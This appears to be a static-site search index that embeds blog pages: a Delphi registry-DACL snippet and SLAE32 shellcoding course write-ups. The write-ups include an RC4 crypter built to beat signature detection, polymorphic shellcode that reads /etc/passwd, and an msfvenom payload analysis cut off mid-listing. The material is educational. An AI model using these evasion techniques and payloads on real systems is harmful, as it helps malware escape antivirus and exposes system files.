'use strict';(function(){const indexCfg={cache:true};indexCfg.doc={id:'id',field:['title','content'],store:['title','href'],};const index=FlexSearch.create('balance',indexCfg);window.bookSearchIndex=index;index.add({'id':0,'href':'/docs/windows/projects/','title':"Projects",'content':"Projects Section   Freeware Open Source Projects  "});index.add({'id':1,'href':'/docs/windows/snippets/delphi/get-registry-key-security-descriptor/','title':"Get Registry Key DACL Security Descriptor",'content':"Below code snippet demonstrate how to get DACL Security Descriptor in SDDL format for a targeted registry key.\nYou need to parse the output SDDL string in order to understand access properties for desired keys, there are plenty of articles arround explaining how to understand an SDDL string format.\nYou can also play with flags associated to ConvertSecurityDescriptorToStringSecurityDescriptor call to extract even more information from captured Security Descriptor Pointer after RegGetKeySecurity call.\n {------------------------------------------------------------------------------- Check if target registry key have write access. Return Code: 0 : Success. 1 : Could not open registry key. 2 : Could not get registry key security requirements. 3 : Could not get registry key security information. 4 : Could not translate security descriptor. 99 : Unknown -------------------------------------------------------------------------------} function GetRegKeySecurityDescriptor(AKeyHive : HKEY; AKeyPath : String; var ASDDL : String) : Cardinal; var AKey : HKEY; pSecDesc : PSecurityDescriptor; ASize : DWORD; ARet : Cardinal; AFlags : Cardinal; AToken : THandle; APrivilegeSet : TPrivilegeSet; AGenericMapping : TGenericMapping; AGrantedAccess : DWORD; AResult : BOOL; AMask : DWORD; hADVAPI : THandle; ASecurityDescriptorStr : PWideChar; AReturnedLength : ULONG; APos : Integer; // https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertsecuritydescriptortostringsecuritydescriptorw ConvertSecurityDescriptorToStringSecurityDescriptor : function( SecurityDescriptor : PSECURITY_DESCRIPTOR; RequestedStringSDRevision : DWORD; SecurityInformation : SECURITY_INFORMATION; var StringSecurityDescriptor : LPWSTR; StringSecurityDescriptorLen : PULONG ) : BOOL; stdcall; const SDDL_REVISION_1 = 1; begin result := 99; ASDDL := ''; /// ARet := RegOpenKeyExW(AKeyHive, PWideChar(AKeyPath), 0, KEY_READ, AKey); if (ARet \u0026lt;\u0026gt; ERROR_SUCCESS) then Exit(1); try ASize := 0; AFlags := ( DACL_SECURITY_INFORMATION or OWNER_SECURITY_INFORMATION or GROUP_SECURITY_INFORMATION ); /// ARet := RegGetKeySecurity(AKey, AFlags, nil, ASize); if (ARet = ERROR_INSUFFICIENT_BUFFER) and (ASize \u0026gt; 0) then begin GetMem(pSecDesc, ASize); try ARet := RegGetKeySecurity(AKey, AFlags, pSecDesc, ASize); if (ARet \u0026lt;\u0026gt; ERROR_SUCCESS) then Exit(3); /// hADVAPI := LoadLibrary('ADVAPI32.DLL'); if (hADVAPI = 0) then Exit(); try @ConvertSecurityDescriptorToStringSecurityDescriptor := GetProcAddress(hADVAPI, 'ConvertSecurityDescriptorToStringSecurityDescriptorW'); if Assigned(ConvertSecurityDescriptorToStringSecurityDescriptor) then begin if NOT ConvertSecurityDescriptorToStringSecurityDescriptor( pSecDesc, SDDL_REVISION_1, DACL_SECURITY_INFORMATION, ASecurityDescriptorStr, @AReturnedLength ) then Exit(4); /// ASDDL := UnicodeString(ASecurityDescriptorStr); end; finally FreeLibrary(hADVAPI); end; finally FreeMem(pSecDesc, ASize); end; end else Exit(2); finally RegCloseKey(AKey); end; end; Example of usage //... var ASDDLOut : String; //... GetRegKeySecurityDescriptor(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\arcsas\\', ASDDLOut); WriteLn(ASDDLOut); Will output something similar to this\nD:AI(A;;KA;;;BA)(A;CI;KR;;;S-1-5-21-1216997795-677674728-3816802077-1001)(A;CIID;KR;;;BU)(A;CIID;KA;;;BA)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;;;AC)(A;CIID;KR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681) Parser I will probably in a near future work on a delphi parser for SDDL Format (Some probably already exists).\nHere is a tiny example using only basic delphi string manipulation techniques (Not the cleanest way) to extract the six properties.\nfunction ParseSDDL_DACL(ASDDL : String) : Boolean; var APos, APosEnd : Integer; AChunk : String; AF1, AF2, AF3 : String; AF4, AF5, AF6 : String; function GetNextChunkProperty() : String; begin result := Copy(AChunk, 1, Pos(';', AChunk)-1); Delete(AChunk, 1, Pos(';', AChunk)); end; begin ASDDL := UpperCase(ASDDL); APos := 0; while true do begin if (APos \u0026gt; 0) then Delete(ASDDL, 1, APos); APos := Pos(':', ASDDL); if (APos = 0) then break; { Attempt to find DACL Security Descriptor } if (Copy(ASDDL, (APos -1), 1) = 'D') then break; end; { Read DACL Security Descriptor } if (APos \u0026gt; 0) then begin Delete(ASDDL, 1, APos); // Clean other Security Descriptor APos := Pos(':', ASDDL); if (APos \u0026gt; 0) then Delete(ASDDL, (APos -1), Length(ASDDL)); { Iterate through each descriptor items } while True do begin if (Length(ASDDL) = 0) then break; APos := Pos('(', ASDDL); APosEnd := Pos(')', ASDDL); if (APos = 0) or (APosEnd = 0) then break; try Inc(APos); AChunk := Copy(ASDDL, APos, (APosEnd - APos)); { Parse chunk } AF1 := GetNextChunkProperty(); // ACE Type AF2 := GetNextChunkProperty(); // ACE Flags AF3 := GetNextChunkProperty(); // Permissions AF4 := GetNextChunkProperty(); // Object Type (GUID) AF5 := GetNextChunkProperty(); // Object Type (GUID) AF6 := GetNextChunkProperty(); // Trustee (SID) { ... ... } finally Delete(ASDDL, 1, APosEnd); // Clean end; end; end; end; Alternative I recently worked on parsing SDDL string from a bunch of registry keys to solve a HackTheBox box without using third part tools (such as AccessChk.exe from SysInternals)\nParsing SDDL string is a very complex task, there is a lot of things to take in consideration in some cases.\nIf for example you want to know if current user have Write Access to a target registry key, instead of using above function and parse output SDDL string (and take in consideration all attributes) we could simply attempt to open target key with KEY_WRITE flag and check whether or not you receive an Access Denied (5) error.\nExample // ... type TAccessStatus = ( asTrue, asFalse, asError ); // ... function CheckCurrentUserKeyAccess(AKeyHive : HKEY; AKeyPath : String; var AStatus : TAccessStatus): Boolean; var AKey : HKEY; ARet : Integer; begin result := False; AStatus := asError; /// ARet := RegOpenKeyExW(AKeyHive, PWideChar(AKeyPath), 0, KEY_WRITE, AKey); try result := ((ARet = ERROR_SUCCESS) or (ARet = ERROR_ACCESS_DENIED)); if NOT result then Exit(); if (ARet = ERROR_ACCESS_DENIED) then AStatus := asFalse else AStatus := asTrue; /// result := True; finally if (ARet = ERROR_SUCCESS) then RegCloseKey(AKey); end; end; // ... var AStatus : TAccessStatus; begin try if CheckCurrentUserKeyAccess(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\arcsas\\', AStatus) then begin case AStatus of asTrue : WriteLn('Access Granted'); asFalse : WriteLn('Access Denied'); asError : WriteLn('Could not determine access status'); end; end; // ... If you have any alternative in minds, just let me know ;)\n"});index.add({'id':2,'href':'/docs/windows/snippets/','title':"Snippets",'content':"Snippet Section   Delphi Python  "});index.add({'id':3,'href':'/docs/linux/slae32/ex7-crypters/','title':"Assignment N°7 - Crypters (Delphi/ASM)",'content':"Assignment Goals This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.\nIf you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.\nWhy? the goal of that certification is to practice and learn how to solve each assignment by yourself. If you read this paper you will get spoiled and seriously oriented to my personal solution and take the risk to abuse of some shortcuts.\nStudent ID: SLAE-1530\n   Create a custom crypter like the one shown in the \u0026ldquo;crypters\u0026rdquo; video\n  Free to use any existing encryption schema\n  Can use any programming language\n  What is the purpose of a Crypter A crypter is very close to encoders. It is a tiny application designed to encrypt a payload and decrypt the payload at runtime.\nThe payload is encrypted and embedded inside a host program often called a stub, when the stub is executed, it will decrypt the encrypted payload and redirect execution flow at decrypted payload address. Sometimes execution flow is not redirected but instead a new thread or a new process is created to host the payload execution.\nConversely to encoders, crypters uses complexes encryptions schema (RC4, AES, Blowfish, Camelia etc\u0026hellip;) to keep the payload obfuscated. Each time a stub is generated, the encrypted payload will look completely different, it is a good solution to beat signature based detection systems.\nBecause of their complexity, crypters are often coded with higher level language such as C/C++, Delphi, .NET etc..\nCreating our custom Crypter Programming Language Used We will use an uncommon language to create our Linux x86-32 crypter. We will use Delphi compiled with Freepascal (Lazarus IDE).\nIt free, open-source and cross-platform.\nYou can install Lazarus on Ubuntu with aptitude using the following command line:\nlocal@user:$ sudo apt install lazarus\nMost of the crypter code will be in Delphi except a small part in Assembly.\nEncryption Schema We will use the RC4 cipher to encrypt and decrypt our payload. This cipher strength is far enough for our needs and is sufficiently easy to implement.\nRC4 specifications is well explained on Wikipedia.\nWe will implement RC4 specifications in a Delphi object to be more convenient.\nTo implement RC4 to Delphi, we need to translate two main methods:\nKSA (Key-scheduling algorithm) Quoted from Wikipedia\nfor i from 0 to 255 S[i] := i endfor j := 0 for i from 0 to 255 j := (j + S[i] + key[i mod keylength]) mod 256 swap values of S[i] and S[j] endfor PRGA (Pseudo-random generation algorithm) Quoted from Wikipedia\ni := 0 j := 0 while GeneratingOutput: i := (i + 1) mod 256 j := (j + S[i]) mod 256 swap values of S[i] and S[j] K := S[(S[i] + S[j]) mod 256] output K endwhile Before doing payload encryption, we first need to call our KSA method to initialize our RC4 cipher then we can call our PRGA method for each payload bytes. The PRGA method will return for each payload byte a new pseudo random number we will use to xor with the current payload byte to encrypt.\nKey Format In above example, the key is defined as a byte array. We could generate random keys as byte array directly but instead initial key format will be string.\nThe key string is called a passphrase and requires to be translated to byte array before getting used by our RC4 cipher.\nWe need to take care of that before calling KSA method.\nFinally, in our future Delphi RC4 cipher object, we must take care of updating passphrase. This will be required by our crypter for brute-forcing key (seen later in this paper).\nEncryption / Decryption In classic RC4 cipher, both Encryption and Decryption process is using the same method.\nPLAIN xor KEY = CIPHERED_MESSAGE xor KEY = PLAIN\nThe main issue is the lack of decryption control, how to be sure our payload was successfully decrypted? for example in the case our passphrase was wrong.\nTo solve this problem we will implement two distinct method: Encrypt() and Decrypt():\nFirst method will first \u0026ldquo;sign\u0026rdquo; plain text, encrypt and return content + the plain-text signature.\nSecond method will first decrypt cipher text, then check for decrypted content signature (plain-text candidate), if both original signature and decrypted content signature matched, then we likely have original plain text.\nTo sign our plain-text we will use CRC32 - Cyclic redundancy check algorithm. We will use CRC32 for it ease of implementation and speed.\nCRC32 is very prone to collision so it is not the ideal solution when it comes to cryptography but it is sufficient for our crypter needs. We could have used SHA1 or SHA2 for more robustness.\nProcess Encryption / Decryption process will except a memory address (Pointer) and data size. We prefer to work directly on memory, we don\u0026rsquo;t have to take care of what is the underlying type of data, we encrypt memory content on the fly.\nCRC32 Implementation Few words about implementing CRC32 to Delphi, we will use the following resources\nWikipedia The following Wikipedia page perfectly describe CRC32 principle.\nWe will take care of translating the following pseudo-code (quoted from Wikipedia) in Delphi.\nFunction CRC32 Input: data: Bytes //Array of bytes Output: crc32: UInt32 //32-bit unsigned crc-32 value //Initialize crc-32 to starting value crc32 ← 0xFFFFFFFF for each byte in data do nLookupIndex ← (crc32 xor byte) and 0xFF; crc32 ← (crc32 shr 8) xor CRCTable[nLookupIndex] //CRCTable is an array of 256 32-bit constants //Finalize the CRC-32 value by inverting all the bits crc32 ← crc32 xor 0xFFFFFFFF return crc32 Above method requires to have a CRC Table, we will grab the CRC32 Table from osdev.org and implement this array of 256 items in our Delphi unit.\nPassphrase Generation Principle At this point we know we will use both RC4 and CRC32 together.\nInstead of having a static key embedded inside the stub for decryption, our stub generator will generate a random key of four bytes (or more).\nThis random key will be sent through our CRC32 method to generate a 8 bytes passphrase (CRC32 generate a 32bit unsigned integer, but we will output this number as an hexadecimal string) thus having a stronger key while keeping something voluntarily easy to brute-force.\nBoth stub generator (crypter program) and stub are not aware of the passphrase, passphrase is completely random and wiped from generator\u0026rsquo;s \u0026ldquo;mind\u0026rdquo;.\nAt run-time the stub will then brute-force the 4 bytes length passphrase until he find the correct plain-text.\nRemember, we know plain-text signatures, stub will need to know that signature to verify decrypted content.\nA four bytes length passphrase will take few seconds to be brute-forced, be aware that increasing key length exponentially increase the duration of payload recovery.\nEmbed Stub Application Template in Generator Our stub generator will be designed to be portable (distributed as a standalone program) thus requiring the stub to be embedded inside the stub generator.\nWhen we generate a new stub, we first extract the stub \u0026ldquo;template\u0026rdquo; from our generator application memory.\nWe will store the stub application as an array of byte inside a special Delphi unit. It means each time we generate a new version of our stub, we need to patch that unit.\nWe will write a tiny Python script to take care of that.\nThis python script will compile both stub and generator using the FPC compiler offered with Lazarus, then translate the raw stub program as a Delphi byte array code instruction to be placed inside a unit designed to host and extract that array.\nIt means that we MUST use that Python script each time we update stub code.\nPayload and Payload Information storage on stub When generator extract a new stub template, the stub is completely free of payload. We need to patch the binary stub (which is a compiled Linux application) with encrypted payload and additional information.\nMultiple techniques exists to patch an already compiled binary, we will use the EOF (End Of File) technique.\nIndeed, appending data at the end of an application doesn\u0026rsquo;t change it execution behavior. Each application is described by what we call an header, this header describe how each section of the binary needs to be considered and mounted in memory. If we append data at the end of an executable, the header wont be aware of that data so it wont take care of it.\nEOF data needs to be structured. The EOF structuring method is up to the programmer. We will structure the EOF as follows:\nEOF_SEGMENT_N|SIZE_OF_SEGMENT_N|...|EOF_SEGMENT2|SIZE_OF_SEGMENT2|EOF_SEGMENT1|SIZE_OF_SEGMENT1\nAn EOF segment can contain any kind of data.\nFor our crypter, we must implement three segments:\n The encrypted payload The plain-text payload signature (CRC32) The key length, required for brute-forcing.  On stub runtime, it will retrieve above three segments for his tasks.\nPayload Execution Method When payload is decrypted at stub runtime, our final task is to redirect execution flow to payload memory address.\nTo do so we will use inline assembly offered by Delphi.\nTo execute code on memory we must be sure memory region that contains that code is set executable otherwise we will receive a seg fault.\nWe will use the mmap2() syscall to create a new executable region, we will then move our payload content to that new region and finally redirect execution flow.\nInitialize Registers (Delphi inline ASM) First we initialize first four registers, mostly for debugging purpose.\nxor ecx, ecx xor ebx, ebx mul ecx Create a new executable memory region (Delphi inline ASM) The size of that region is our payload size\nmov eax, $c0 // mmap2() syscall mov ecx, [ADataSize] // payload length mov edx, $7 // PROT_READ | PROT_WRITE | PROT_EXEC mov esi, $22 // MAP_PRIVATE | MAP_ANONYMOUS mov edi, $ffffffff Copy decrypted payload to new region (Delphi inline ASM) mov esi, pShellcode // decrypted shellcode address mov edi, eax // eax contains new executable region address xor eax, eax @mem_copy: mov al, [esi] mov [edi], al inc si inc di loop @mem_copy Execute shellcode (Delphi inline ASM) sub edi, [ADataSize] // subtract shellcode length to go back to memory region start address call edi // execute shellcode Final Project The final project is available at this Github address: https://github.com/DarkCoderSc/slae32-crypters/\nlocal@user:$ git clone https://github.com/DarkCoderSc/slae32-crypters.git\nIt is structured as follows:\ncrypter Folder Contains the builder / stub generator source code.\nstub Folder Contains the stub source code.\nshared Folder Contains shared unit between both builder and stub\ndist Folder Contains standalone version of the builder (stub embedded and ready for production use)\nbuild.py Python script used to build a new standalone version of the builder.\nIt will compile new version of stub binary then embed stub binary inside builder stub unit before final compilation.\nVery last step of the build is to move compiled standalone builder in dist folder and clean the workspace.\nBuild Usage local@user:$ python3 build.py\nCrypter Usage local@user:$ Crypter/dist/crypter \u0026lt;shellcode\u0026gt; \u0026lt;outputfile\u0026gt;\nExample In this example we used our cat /etc/passwd shellcode.\nlocal@user:$ Crypter/dist/crypter \u0026quot;\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x69\\x6e\\x2f\\x2f\\x68\\x2f\\x2f\\x2f\\x62\\x89\\xe3\\x66\\xb8\\x2d\\x63\\x50\\x31\\xc0\\x89\\xe2\\x50\\x68\\x73\\x73\\x77\\x64\\x68\\x63\\x2f\\x70\\x61\\x68\\x20\\x2f\\x65\\x74\\x68\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe6\\x50\\x56\\x52\\x53\\x89\\xe1\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80\u0026quot; /tmp/encrypted_payload local@user:$ /tmp/encrypted_payload\n"});index.add({'id':4,'href':'/docs/','title':"Docs",'content':""});index.add({'id':5,'href':'/docs/linux/','title':"Linux",'content':""});index.add({'id':6,'href':'/docs/linux/slae32/','title':"SLAE32",'content':"SLAE32 Certification Assignments  Those papers are part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.\nIf you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading exercises solutions.\nStudent ID: SLAE-1530\n  Assignments Papers  Bindshell (NASM) Reverse Shell (NASM) Egg Hunter (C) Shellcode Encoder (NASM) Shellcode Analyzing / Dissecting Polymorphism Crypters (Delphi/ASM)  Github Repositories  https://github.com/DarkCoderSc/tcp-bindshell-shellcode-slae32 https://github.com/DarkCoderSc/slae32-reverse-shell https://github.com/DarkCoderSc/slae32-egghunters https://github.com/DarkCoderSc/slae32-xor-encoder No repository. https://github.com/DarkCoderSc/slae32-polymophism https://github.com/DarkCoderSc/slae32-crypters  "});index.add({'id':7,'href':'/docs/linux/slae32/ex6-polymorphism/','title':"Assignment N°6 - Polymorphism",'content':"Assignment Goals This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.\nIf you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.\nWhy? the goal of that certification is to practice and learn how to solve each assignment by yourself. If you read this paper you will get spoiled and seriously oriented to my personal solution and take the risk to abuse of some shortcuts.\nStudent ID: SLAE-1530\n   Take up 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching.\n  The polymorphic versions cannot be larger 150% of the existing shellcode.\n  Bonus points for making it shorter in length than original.\n  Foreword On Shell-Storm, you will not always find the original assembly code for shellcodes you choose. To solve this issue, we\u0026rsquo;ve created a tiny Python script to convert a shellcode from its string form to raw format (stdout). We can easily pipe output result to Ndisasm and recover an assembly code very close to the original version.\nConverter (Python3) #!/usr/bin/python3 # Jean-Pierre LESUEUR (@DarkCoderSc) # www.phrozen.io # SLAE32 import sys def bytestr_to_bytearr(data): return list(bytearray.fromhex(data.replace(\u0026quot;\\\\x\u0026quot;, \u0026quot; \u0026quot;))) if (len(sys.argv) != 2): print(\u0026quot;Usage: shellcode_to_raw.py \u0026lt;shellcode[Ex: \\\\xff\\\\x90\\\\x92...]\u0026gt;\u0026quot;) else: sys.stdout.buffer.write(bytes(bytestr_to_bytearr(sys.argv[1]))) Usage local@user:$ chmod +x shellcstr_to_raw.py\nlocal@user:$ ./shellcstr_to_raw.py \u0026lt;shellcode_string\u0026gt; | ndisasm -b32 -\nShellcode N°1 - Read Passwd File.  As first shellcode, we chose the following one : /bin/cat /etc/passwd\nRetrieve Assembly Form We will use our tiny python script to retrieve the assembly form of this shellcode.\nlocal@user:$ ./shellcstr_to_raw.py \u0026quot;\\x31\\xc0\\x99\\x52\\x68\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x68\\x73\\x73\\x77\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63\\x89\\xe1\\xb0\\x0b\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80\u0026quot; | ndisasm -b32 - Result 00000000 31C0 xor eax,eax 00000002 99 cdq 00000003 52 push edx 00000004 682F636174 push dword 0x7461632f 00000009 682F62696E push dword 0x6e69622f 0000000E 89E3 mov ebx,esp 00000010 52 push edx 00000011 6873737764 push dword 0x64777373 00000016 682F2F7061 push dword 0x61702f2f 0000001B 682F657463 push dword 0x6374652f 00000020 89E1 mov ecx,esp 00000022 B00B mov al,0xb 00000024 52 push edx 00000025 51 push ecx 00000026 53 push ebx 00000027 89E1 mov ecx,esp 00000029 CD80 int 0x80 Shellcode Purpose This shellcode is a basic execve() call to execute the following command : /bin/sh -c \u0026quot;cat /etc/passwd\u0026quot;\nIt uses the stack technique to store execve() parameters.\nOriginal Size is 43 Bytes.\nPolymorphic Version Biggest Changes Instead of using stack for storing the execve() command, we will use the Jump Call Pop technique.\nWe need to store two distinct strings for our execve() call. To do so, we will store our execve() payload in the same defined byte array separated by a random byte 0xff.\nOn run time, we will replaced the 0xff delimiter by NULL characters to break the string in two slices (We want to keep target shellcode free from NULL characters).\nIn addition of that we will use equivalent instructions to achieve the same original goal. For example instead of doing :\nxor eax, eax xor edx, edx We will do\nxor eax, eax mov edx, eax etc..\nResult global _start _start: jmp short _call _pop: xor eax, eax ; initialize eax register mov edx, eax ; initialize edx pop ebx ; /bin/cat mov byte [ebx+0x8], al ; update 0xff with NULL mov byte [ebx+0x14], al ; update 0xff with NULL lea ecx, [ebx+0x9] ; place ecx to /etc/passwd ; replace push instructions push eax ; NULL (EOF Argv) push ecx ; */etc/passwd push ebx ; */bin/cat\tmov ecx, esp ; **/bin/cat add al, 0xb ; equal to mov al, 0xb. execve() syscall int 0x80 ; call syscall() _call: call _pop ; /bin/cat /etc/passwd spell: db 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x63, 0x61, 0x74, 0xff, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0xff New Size is 51 Bytes.\nShellcode N°2 - Create new Directory.  For our second shellcode we will use mkdir() \u0026amp;\u0026amp; exit() from shell-storm.org.\nRetrieve Assembly Form Like for our first shellcode, we will use our tiny script to recover it original assembly code (as close as possible)\nlocal@user:$ ./shellcstr_to_raw.py \u0026quot;\\xeb\\x16\\x5e\\x31\\xc0\\x88\\x46\\x06\\xb0\\x27\\x8d\\x1e\\x66\\xb9\\xed\\x01\\xcd\\x80\\xb0\\x01\\x31\\xdb\\xcd\\x80\\xe8\\xe5\\xff\\xff\\xff\\x68\\x61\\x63\\x6b\\x65\\x64\\x23\u0026quot; | ndisasm -b32 - Result 00000000 EB16 jmp short 0x18 00000002 5E pop esi 00000003 31C0 xor eax,eax 00000005 884606 mov [esi+0x6],al 00000008 B027 mov al,0x27 0000000A 8D1E lea ebx,[esi] 0000000C 66B9ED01 mov cx,0x1ed 00000010 CD80 int 0x80 00000012 B001 mov al,0x1 00000014 31DB xor ebx,ebx 00000016 CD80 int 0x80 00000018 E8E5FFFFFF call 0x2 0000001D 6861636B65 push dword 0x656b6361 00000022 64 fs 00000023 23 db 0x23 Shellcode Purpose This very small shellcode will create a new directory called hacked on current directory. It will use the mkdir syscall to achieve his goal.\nThe hacked string is stored at the end of the shellcode using the Jump Call Pop technique (6861636B6564).\nWhen directory is created, it will exit gracefully with error code equal to zero.\nOriginal Size is 36 Bytes.\nPolymorphic Version Biggest Changes This time, we will replace the Jump Call Pop technique by the stack method to store the directory name. Using stack instead of Jump Call Pop will save few bytes for our shellcode.\nApart this change, we will also tweak assembly instructions to achieve same result but using different instructions combinations.\nResult global _start _start: xor eax, eax ; initialize eax cdq ; initialize edx push ax ; 0 (NULL) mov cx, 0x6465 ; \u0026quot;de\u0026quot; push cx ; could also be (push word 0x6465) push 0x6b636168 ; \u0026quot;kcah\u0026quot; mov al, 0x27 ; mkdir() syscall mov ebx, esp ; directory name mov cx, 0x1ed ; mode\tint 0x80 ; call syscall sub al, 0x26 ; = 0x1, exit() syscall mov bl, dl ; exit code equal zero int 0x80 ; call syscall New Size is 32 Bytes.\nShellcode N°3 - Read File Content.  For our last shellcode, we will choose a more complex one still from shell-storm titled File Reader\nRetrieve Assembly Form Again, we will use our python script to recover the closest possible assembly instructions for our last shellcode.\nlocal@user:$ ./shellcstr_to_raw.py \u0026quot;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xeb\\x32\\x5b\\xb0\\x05\\x31\\xc9\\xcd\\x80\\x89\\xc6\\xeb\\x06\\xb0\\x01\\x31\\xdb\\xcd\\x80\\x89\\xf3\\xb0\\x03\\x83\\xec\\x01\\x8d\\x0c\\x24\\xb2\\x01\\xcd\\x80\\x31\\xdb\\x39\\xc3\\x74\\xe6\\xb0\\x04\\xb3\\x01\\xb2\\x01\\xcd\\x80\\x83\\xc4\\x01\\xeb\\xdf\\xe8\\xc9\\xff\\xff\\xff\u0026quot; | ndisasm -b32 - Result 00000000 31C0 xor eax,eax 00000002 31DB xor ebx,ebx 00000004 31C9 xor ecx,ecx 00000006 31D2 xor edx,edx 00000008 EB32 jmp short 0x3c 0000000A 5B pop ebx 0000000B B005 mov al,0x5 0000000D 31C9 xor ecx,ecx 0000000F CD80 int 0x80 00000011 89C6 mov esi,eax 00000013 EB06 jmp short 0x1b 00000015 B001 mov al,0x1 00000017 31DB xor ebx,ebx 00000019 CD80 int 0x80 0000001B 89F3 mov ebx,esi 0000001D B003 mov al,0x3 0000001F 83EC01 sub esp,byte +0x1 00000022 8D0C24 lea ecx,[esp] 00000025 B201 mov dl,0x1 00000027 CD80 int 0x80 00000029 31DB xor ebx,ebx 0000002B 39C3 cmp ebx,eax 0000002D 74E6 jz 0x15 0000002F B004 mov al,0x4 00000031 B301 mov bl,0x1 00000033 B201 mov dl,0x1 00000035 CD80 int 0x80 00000037 83C401 add esp,byte +0x1 0000003A EBDF jmp short 0x1b 0000003C E8C9FFFFFF call 0xa .string \u0026quot;/etc/passwd\u0026quot; Shellcode Purpose The purpose of this shellcode is to read the content of any file and write back to stdout file descriptor.\nTo do so it will smartly read desired file byte by byte until it fail for any reasons (most likely EOF).\nThe desired file name must be appended at the end of the shellcode. The shellcode is using Jump Call Pop technique to store the file name.\nPolymorphic Version Biggest Changes This time we wont switch between Jump Call Pop and Stack techniques for storing strings. We will scramble most instructions to achieve the same goal.\nThe main objective of this polymorphic version was to:\n Reduce the size of the payload (not to his maximum tho, this is not our goal). Achieve the same result while altering most original instructions.  While creating the polymorphic version, we kept in mind registry status at each steps, even through jump calls to create something more difficult to understand.\nOne example and very efficient to evade some weak detection systems was to used the predictable return value of write() call, and use it value to reassign a new syscall number.\nResult global _start _start: xor ecx, ecx ; initialize ecx mul ecx ; initialize eax, edx jmp short _call ; start Jump Call Pop _pop: mov ebx, [esp]\t; recover filename (equivalent to pop ebx) add al, 0x6 dec al ; 0x5 open() syscall number int 0x80 ; call syscall xchg ebx, eax ; assign file handle to ebx mov esi, ebx ; copy file handle to esi xchg eax, ecx ; exchange ecx and eax values (eax = 0) mov ecx, esp ; our *buffer inc edx ; read file byte by byte inc eax ; eax = 1 _read_chunk: add al, 0x2 ; 0x3 read() syscall number\tint 0x80 ; call syscall cmp eax, edx ; check if eax is equal to edx jne _exit ; if not equal we've probably reached the EOF add al, 0x3 ; 0x4 write() syscall number mov ebx, edx ; edx = 1 so ebx = 1 = stdout file descriptor number int 0x80 ; call syscall mov ebx, esi ; restore opened file descriptor (handle) jmp short _read_chunk ; read next chunk\t_exit: mov al, dl ; edx = 0x1 so eax = 0x1 = exit() syscall dec edx ; edx = 0 xchg ebx, edx ; ebx = 0\tint 0x80 ; call syscall _call: call _pop ; filename: db 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64 New Size is 53 Bytes.\nAfterword You will find all codes on the following Github repository : https://github.com/DarkCoderSc/slae32-polymophism\n"});index.add({'id':8,'href':'/docs/linux/slae32/ex5-shellcode-analyzing/','title':"Assignment N°5 - Shellcode Analyzing / Dissecting",'content':"Assignment Goals This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.\nIf you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.\nWhy? the goal of that certification is to practice and learn how to solve each assignment by yourself. If you read this paper you will get spoiled and seriously oriented to my personal solution and take the risk to abuse of some shortcuts.\nStudent ID: SLAE-1530\n   Take up at least 3 shellcode samples created using Msfpayload for Linux/x86.\n  Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode.\n  Present your analysis.\n  Shellcode Candidates We will use Msfvenom from Metasploit Framework to generate three different payloads for Linux x86-32.\nWe can easily enumerate payloads for this architecture and operating system using the following command:\nlocal@user:$ msfvenom -l payloads | grep \u0026quot;linux/x86\u0026quot;\nWe decided to use the three following payloads:\n linux/x86/read_file linux/x86/chmod linux/x86/exec  Shellcode N°1 - linux/x86/read_file (Ndisasm) Generate Payload To generate our shellcode, let\u0026rsquo;s first understand which parameters are expected for this payload.\nlocal@user:$ msfvenom -p linux/x86/read_file -a x86 --platform Linux --list-options\nName Current Setting Required Description ---- --------------- -------- ----------- FD 1 yes The file descriptor to write output to PATH yes The file path to read By default output file content is appended to File Descriptor 1 (stdout), we will keep it as is.\nWe need however to specify the file to be read by the payload. We will choose /etc/passwd file. This file can be read by any user.\nWe can now generate our final payload to local disk as binary file payload1.bin.\nlocal@user:$ msfvenom -p linux/x86/read_file -a x86 --platform Linux PATH=/etc/passwd -f RAW \u0026gt; payload1.bin\nStatic Analysis (Ndisasm) Let\u0026rsquo;s use Ndisasm to retrieve as close as possible assembly instructions that compose this payload.\nlocal@user:$ cat payload1.bin | ndisasm -p intel -b32 -\nOutput Assembly Analysis ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; Jump Call Pop Begin. ; #JUMP. ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 00000000 EB36 jmp short 0x38 ; Jump to 0x38 offset. ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; Open File. ; Syscall n°5 (0x5) ; open(const char *filename, int flags, umode_t mode) 